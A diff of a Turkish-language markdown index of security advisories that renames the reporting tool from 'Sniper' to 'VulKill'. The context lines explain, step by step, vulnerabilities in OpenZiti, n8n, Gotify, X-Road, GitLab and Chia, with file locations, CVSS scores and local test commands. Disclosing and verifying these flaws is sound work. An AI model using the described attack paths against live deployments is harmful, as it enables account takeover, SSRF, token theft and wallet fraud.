 Docker'da bir konteyner başlatırken `-p 8006:8006` yazmak ile `-p 127.0.0.1:8006:8006` yazmak arasında devasa bir güvenlik farkı vardır: Başında `127.0.0.1:` yoksa Docker portu **`0.0.0.0` (makinenin tüm Wi-Fi ve Ethernet ağ kartları)** üzerinde açar ve Linux'ta `iptables` `DOCKER` zinciri üzerinden yerel güvenlik duvarı (`ufw`) kurallarını bile atlayarak aynı ağdaki herkese yayınlar!
@@ -1145,7 +1145,7 @@ python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real
 * **Etkilenen Sürüm & Bileşenler:** `<= v2` (`commit 236f351a5149fe68328fc8083bebe514f0307d0c`) — `ziti/util/certs.go` (`AreCertsTrusted` ve `InsecureClient`, satır `91-103, 199-208`) ve `ziti/cmd/edge/login.go` (`fetchTrustedServerCerts`, satır `511, 535-549`)
 * **Zafiyet Sınıfı & Skor:** `CWE-295` (Uygunsuz Sertifika Doğrulaması — TLS Doğrulama Atlama) — **CVSS v3.1: `7.4 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
 * **GitHub GHSA Bağlantısı:** `GHSA-qwv8-hh9r-cqrf` (`https://github.com/openziti/ziti/security/advisories/GHSA-qwv8-hh9r-cqrf`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/tr/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/tr/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 OpenZiti bir **Sıfır-Güven (Zero-Trust)** ağ platformudur. Bir sistem yöneticisi `ziti edge login https://controller:1280 -u admin -p <parola>` komutunu çalıştırdığında, CLI aracı önce denetleyicinin sunduğu TLS sertifikasının gerçekten güvenilir olup olmadığını kontrol etmek için `AreCertsTrusted(host, wellKnownCerts, httpClient)` (`ziti/util/certs.go:91-103`) fonksiyonunu çağırır ve başarılı olursa ekrana şu güven verici mesajı yazar (`login.go:511`):
@@ -1201,7 +1201,7 @@ Go'nun standart `crypto/tls` kütüphanesinde `InsecureSkipVerify: true` olduğu
 # 1. OpenZiti ziti/util paketi üzerinde gerçek Go TLS el sıkışma testini çalıştırma
 go test -v -run TestRealOpenZitiAreCertsTrusted ./ziti/util
 
-# 2. Sniper uçtan uca doğrulama koşumunu çalıştırma
+# 2. VulKill uçtan uca doğrulama koşumunu çalıştırma
 python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_ziti_cand01
 ```
 **Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`):**
@@ -1237,7 +1237,7 @@ python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real
 * **Etkilenen Sürüm & Bileşenler:** `<= 2.45.0` (`commit cfbd9a56cba2e73901dc1962e47727adbea0b23e`) — `packages/workflow/src/extensions/string-extensions.ts` (`EMAIL_REGEXP`, `DOMAIN_EXTRACT_REGEXP`, `isEmail`, `extractEmail`, `extractDomain`, satır `59, 94, 326, 375, 383`)
 * **Zafiyet Sınıfı & Skor:** `CWE-1333` (Verimsiz Düzenli İfade Karmaşıklığı — ReDoS / Olay Döngüsü Hizmet Reddi) — **CVSS v3.1: `5.3 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`)
 * **GitHub GHSA Bağlantısı:** `n8n-workflow <= 2.45.0` (`https://github.com/n8n-io/n8n/security/advisories`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/tr/09-N8N-CAND-01-WEBHOOK-REDOS.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/tr/09-N8N-CAND-01-WEBHOOK-REDOS.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 n8n, şirketlerin web formlarını, ödeme bildirimlerini ve e-postaları otomatikleştirmek için kullandığı Node.js tabanlı bir iş akışı motorudur. Node.js **tek iş parçacıklı (single-threaded) bir olay döngüsü (event loop)** üzerinde çalışır; yani ana iş parçacığını 1 saniye boyunca meşgul eden bir işlem, o sırada sunucuya gelen diğer tüm müşterilerin isteklerini de dondurur.
@@ -1321,7 +1321,7 @@ python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real
 * **Etkilenen Sürüm & Bileşenler:** `<= v2.9.1` (`commit f4de61997c1b30bf9ac43ec662dc5120c2ec981b`) — `router/router.go` (`Create`, satır `52-73, 93-102`)
 * **Zafiyet Sınıfı & Skor:** `CWE-601` (Güvenilmeyen Siteye URL Yönlendirmesi — Doğrulanmamış `Host` Başlığı ile Açık Yönlendirme) — **CVSS v3.1: `4.7 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N`)
 * **GitHub GHSA Bağlantısı:** `GHSA-cc9f-m5vr-pm75` (`https://github.com/gotify/server/security/advisories/GHSA-cc9f-m5vr-pm75`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/tr/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/tr/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 Gotify, kendi sunucunuzda barındırabildiğiniz popüler bir anlık bildirim (push notification) sunucusudur. Yapılandırmada yerleşik SSL yönlendirmesi (`SSL.Enabled: true` ve `SSL.RedirectToHTTPS: true`) açıldığında, Gotify HTTP (`80`) portuna gelen istekleri otomatik olarak HTTPS (`443`) adresine yönlendirmek için `router/router.go:52-73` içinde bir ara katman (middleware) çalıştırır.
@@ -1400,7 +1400,7 @@ go test -v ./router -run TestHTTPSRedirect
 * **Etkilenen Sürüm & Bileşenler:** `develop` (`commit 38cd99ec0ebbcc13ddbaaeb9187018d49bdd278b`) — `.github/workflows/build.yaml` (satır `14-58`) ve `.github/workflows/_build-and-package.yml` (satır `27, 84-91`)
 * **Zafiyet Sınıfı & Skor:** `CWE-78` (İşletim Sistemi Komutunda Kullanılan Özel Öğelerin Uygunsuz Etkisizleştirilmesi — Self-Hosted Runner üzerinde CI Komut Enjeksiyonu) — **CVSS v3.1: `8.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`)
 * **GitHub GHSA Bağlantısı:** `GHSA-4fcw-7xqx-fjv5` (`https://github.com/nordic-institute/X-Road/security/advisories/GHSA-4fcw-7xqx-fjv5`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/tr/11-XROAD-CAND-01-RUNNER-INJECTION.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/tr/11-XROAD-CAND-01-RUNNER-INJECTION.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 X-Road, devlet kurumları ve bankalar arasında güvenli veri alışverişi sağlayan kritik bir e-devlet altyapı yazılımıdır. Depodaki `.github/workflows/build.yaml:14-58` iş akışı her `pull_request` ve `push` olayında tetiklenir, kendisine **`permissions: contents: write, packages: write`** yetkisi verir ve **`secrets: inherit`** (tüm gizli anahtarları aktar) diyerek `.github/workflows/_build-and-package.yml` iş akışını çağırır.
@@ -1474,7 +1474,7 @@ python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real
 * **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE: gitlab-ce / gitlab-ee`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `app/controllers/oauth/device_authorizations_controller.rb:4-50`, `app/controllers/oauth/tokens_controller.rb:42-75`
 * **Zafiyet Sınıfı & Skor:** `CWE-863 / CWE-285` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md`](advisories/tr/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md`](advisories/tr/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `verify_admin_allowed!` Eksikliği Nedeniyle Varsayılan `disable_admin_oauth_scopes` Korumasının Atlanması (`CAND-02A`, `device_authorizations_controller.rb:4-42`):** Kardeş denetleyici `Oauth::AuthorizationsController` (`authorizations_controller.rb:18, 274-296`), `before_action :verify_admin_allowed!` muhafızı ile `Gitlab::CurrentSettings.disable_admin_oauth_scopes == true` (varsayılan güvenlik ayarı) iken güvenilmeyen (`trusted: false`) OAuth uygulamalarının yöneticilere `api`, `admin_mode`, `sudo` gibi tehlikeli kapsamlarla bağlanmasını `403 Forbidden` ile engeller. Ancak `Oauth::DeviceAuthorizationsController` bu kontrolü tamamen unuttuğu için, sıradan bir kullanıcının oluşturduğu `trusted: false, device_code_enabled: true, scopes: 'api admin_mode'` uygulama `/oauth/device` üzerinden tam yetkili yönetici (`is_admin: true`) erişim jetonu üretebilir.
@@ -1559,7 +1559,7 @@ python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_
 * **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/catalog/mcp_servers/callback_service.rb:17-50, 87-129`, `refresh_token_service.rb:18-70`, `dynamic_registration_client.rb:104-136`
 * **Zafiyet Sınıfı & Skor:** `CWE-918 / CWE-209` — **CVSS v3.1: `8.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md`](advisories/tr/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md`](advisories/tr/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — RFC 8414 `token_endpoint`, `revocation_endpoint` ve `authorization_servers` Adreslerinin `UrlBlocker` İle Doğrulanmaması (`dynamic_registration_client.rb:104-136`):** `DynamicRegistrationClient`, yalnızca ilk keşif URL'sini kontrol eder; ancak dönen JSON içindeki `authorization_servers.first`, `token_endpoint` ve `revocation_endpoint` alanlarını `Gitlab::HTTP_V2::UrlBlocker.validate!` süzgecinden geçirmeden doğrudan döndürür.
@@ -1645,7 +1645,7 @@ python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_
 * **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/controllers/oauth/mcp_connectors_auth_controller.rb:16-78`, `ee/app/services/ai/catalog/mcp_servers/connect_service.rb:16-79`, `ee/lib/gitlab/oauth/client_state.rb:17-23`
 * **Zafiyet Sınıfı & Skor:** `CWE-639 / CWE-862` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md`](advisories/tr/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md`](advisories/tr/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `.in_organization(Current.organization)` Olmadan Global `Ai::Catalog::McpServer.find` Çağrısı (`mcp_connectors_auth_controller.rb:19, 38, 63, 71-73`):** Denetleyici, yetki kontrolünü çağrıyı yapanın kendi organizasyonu (`Current.organization`) üzerinde yaptıktan sonra `::Ai::Catalog::McpServer.find(mcp_server_params[:id])` ile tüm veritabanında arama yapar. Böylece Organizasyon A'daki bir kullanıcı Organizasyon B'ye ait bir `McpServer` kaydına doğrudan erişebilir.
@@ -1719,7 +1719,7 @@ python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_
 * **Hedef Depo & Paket:** `gitlab-org/gitlab` (`Go / GitLab Workhorse: gitlab.com/gitlab-org/gitlab/workhorse`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `workhorse/internal/ai_assist/duoworkflow/mcp.go:25-60, 101-112, 220-239`
 * **Zafiyet Sınıfı & Skor:** `CWE-918 / CWE-522` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md`](advisories/tr/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md`](advisories/tr/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `externalMcpTransport` Tanımında `transport.WithSSRFFilter` Argümanının Unutulması (`workhorse/internal/ai_assist/duoworkflow/mcp.go:41-44`):** Workhorse'un `transport.NewRestrictedTransport` fonksiyonu yalnızca açıkça `transport.WithSSRFFilter(...)` opsiyonu verildiğinde (`workhorse/internal/sendurl/sendurl.go:365-374` içinde yapıldığı gibi) özel IP, loopback (`127.0.0.1`) ve bulut metadata (`169.254.169.254`) adreslerini engeller. `mcp.go:41-44` bu parametreyi vermediği için harici MCP bağlantılarında hiçbir IP seviyesi SSRF filtresi çalışmaz.
@@ -1795,7 +1795,7 @@ python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_
 * **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/duo_workflows/mcp_config_service.rb:131-135`, `ee/lib/api/ai/duo_workflows/workflows.rb:341-344, 1065`, `connection_config_service.rb:220-228`
 * **Zafiyet Sınıfı & Skor:** `CWE-862 / CWE-639` — **CVSS v3.1: `7.7 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md`](advisories/tr/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md`](advisories/tr/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Aynı Dosya İçindeki (`mcp_config_service.rb:134` vs `334`) Açık Yetki Çelişkisi:** `ee/app/services/ai/duo_workflows/mcp_config_service.rb` dosyasının 334. satırındaki `ai_catalog_mcp_servers` metodu `return {} unless Ability.allowed?(current_user, :read_ai_catalog_item, item_version)` kontrolünü yaparken, aynı dosyanın 134. satırındaki `item_version` metodu hiçbir yetki kontrolü yapmadan `::Ai::Catalog::ItemVersion.find_by_id(ai_catalog_item_version_id)` döndürür.
@@ -1872,7 +1872,7 @@ python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_
 * **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems & Go / GitLab EE & Workhorse: gitlab-ee`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/duo_workflows/mcp_config_service.rb:57-64`, `ee/app/services/ai/catalog/mcp_servers/list_service.rb:14-24`, `workhorse/internal/ai_assist/duoworkflow/mcp.go:254`
 * **Zafiyet Sınıfı & Skor:** `CWE-863 / CWE-639` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md`](advisories/tr/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md`](advisories/tr/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `McpConfigService#execute` İçinde `.except(:orbit)` Kullanılıp `:gitlab` Anahtarının Unutulması (`mcp_config_service.rb:59-63`):** `McpConfigService#execute`, `gitlab_mcp_server(denied).merge(orbit_mcp_server).merge(ai_catalog_mcp_servers.except(:orbit))` çağrısıyla MCP yapılandırmasını oluşturur. Geliştirici `:orbit` anahtarını ezilmeye karşı korurken `:gitlab` anahtarını (`.except(:gitlab, :orbit, :slack)`) unutmuştur. Bu nedenle adı `"GitLab"` (`server_key => :gitlab`) olan bir `Ai::Catalog::McpServer` kaydı, yerleşik `:gitlab` yapılandırmasını ve `:Tools` izin listesini tamamen ezer.
@@ -1941,7 +1941,7 @@ python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_
 * **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE: gitlab-ce / gitlab-ee`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `app/controllers/projects/integrations/slash_commands_controller.rb:21-48`, `app/models/concerns/integrations/base/slash_commands.rb:6-10, 68-76`
 * **Zafiyet Sınıfı & Skor:** `CWE-601 / CWE-863` — **CVSS v3.1: `5.4 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md`](advisories/tr/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md`](advisories/tr/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — `raise_on_open_redirects = false` Ayarıyla Doğrudan `redirect_to request_params[:redirect_url]` Çağrılması (`slash_commands_controller.rb:26`):** `show` aksiyonu (satır 11) yönlendirme adresini güvenli `integration_redirect_url` metodundan hesaplarken, `confirm` aksiyonu (satır 26) doğrudan kullanıcıdan gelen `request_params[:redirect_url]` parametresine `redirect_to` yapar.
@@ -2011,7 +2011,7 @@ python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_
 * **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE (Devise 5.0.3): gitlab-ce / gitlab-ee (devise 5.0.3)`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (Devise 5.0.3 CVE-2026-40295 upstream dependency & Oauth::AuthorizationsController defense-in-depth)` — `lib/gitlab/devise_failure.rb:4-18`, `lib/gitlab/auth/session_expire_from_init_enforcer.rb:44-62`, `app/controllers/oauth/authorizations_controller.rb:316-330`
 * **Zafiyet Sınıfı & Skor:** `CWE-601 / CWE-345` — **CVSS v3.1: `5.4 Medium (Upstream CVE-2026-40295 Duplicate)`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md`](advisories/tr/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md`](advisories/tr/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Önemli Duplicate (Mükerrer Kayıt) ve MITRE Gönderim Dışı Bildirimi:** Gönderim öncesi doğrulama kapımızda, `Gitlab::DeviseFailure#redirect_url` açık yönlendirme bulgusunun üst akış **Devise `5.0.3` `CVE-2026-40295`** kaydının GitLab üzerindeki ürün etkisi (duplicate) olduğu; `GITLAB-CAND-03` (`validate_pkce_for_dynamic_applications`) bulgusunun ise çalışma zamanında `Doorkeeper 5.9.3` (`config/initializers/doorkeeper.rb:158` `pkce_code_challenge_methods ['S256']`) tarafından engellendiği kanıtlanmıştır. Bu nedenle **bu belge şeffaflık ve savunma yaması amacıyla GitHub'da yayımlanmış, ancak mükerrer (duplicate) olduğu için MITRE CNA-LR'a yeni CVE başvurusu olarak GÖNDERİLMEMİŞTİR**.
@@ -2071,7 +2071,7 @@ sed -n '316,330p' /home/community-user/targets/gitlab/app/controllers/oauth/auth
 * **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/wallet/wallet_node.py:926-995` (`_add_block_from_header`)
 * **Zafiyet Sınıfı & Skor:** `CWE-345 / CWE-347` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md`](advisories/tr/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md`](advisories/tr/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Başlık ve İşlem Gövdesi Arasındaki SHA-256 Bağlamasının Kontrol Edilmemesi (`chia/wallet/wallet_node.py:926-995`):** Chia blok yapısında imzalı blok başlığı (`HeaderBlock.foliage`), içindeki işlem blokunun özetini `header_block.foliage.foliage_transaction_block_hash` alanında tutar. Ancak `WalletNode._add_block_from_header` metodu P2P ağından gelen `RespondBlockHeader` paketini işlerken `header_block.foliage_transaction_block.get_hash() == header_block.foliage.foliage_transaction_block_hash` eşitliğini kontrol etmeyi unutur.
@@ -2135,7 +2135,7 @@ CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pyt
 * **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/wallet/wallet_node.py:725-777`, `chia/wallet/wallet_state_manager.py:1735-1778`
 * **Zafiyet Sınıfı & Skor:** `CWE-345 / CWE-400` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md`](advisories/tr/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md`](advisories/tr/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Kanıtsız (`proofs=None`) `RespondRemovals` / `spent_height` Bildiriminin Doğrulanmadan Kabul Edilmesi (`wallet_node.py:725-777` & `wallet_state_manager.py:1735-1778`):** Cüzdan P2P ağından gelen `RespondRemovals(height=8, coins=[(coin_name, None)], proofs=None)` mesajını işlerken, blok başlığına bağlı Merkle silinme kanıtını (`validate_removals`) doğrulamadan SQLite `WalletCoinStore` içinde coin'i `spent_height=8` (harcanmış) olarak işaretler.
@@ -2198,7 +2198,7 @@ CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pyt
 * **Hedef Depo & Paket:** `Chia-Network/chia-blockchain-gui` (`npm / TypeScript (Electron Desktop GUI): chia-blockchain-gui`)
 * **Etkilenen Sürüm & Bileşenler:** `<= 2.6.1-rc2.dev60 (verified on commit 2f6ee83a23ac8b0370b96111e02f8edfb81fa1f3)` — `packages/gui/src/components/walletConnect/WalletConnectContext.tsx:314-441`, `constants/WalletConnectCommands.ts`
 * **Zafiyet Sınıfı & Skor:** `CWE-367 / CWE-285` — **CVSS v3.1: `8.8 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md`](advisories/tr/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md`](advisories/tr/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 1. **Adım 1 — Cüzdan Bağlandığında 29 Komutun Tamamına (Para Gönderme Dahil) Kapı Açılması (`WalletConnectCommands.ts`):** Günlük hayattan benzetmeyle *'Kimlik fotokopisi isteyen emlakçının arkadaki boş senetlere imza attırması'* gibidir. Kullanıcı bir NFT/ödül sitesine sadece adres doğrulamak için cüzdanını bağladığında, WalletConnect oturumu `chia_sendTransaction` (para gönderme) dahil 29 komutun tamamını aynı oturuma açar.
@@ -2266,7 +2266,7 @@ CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pyt
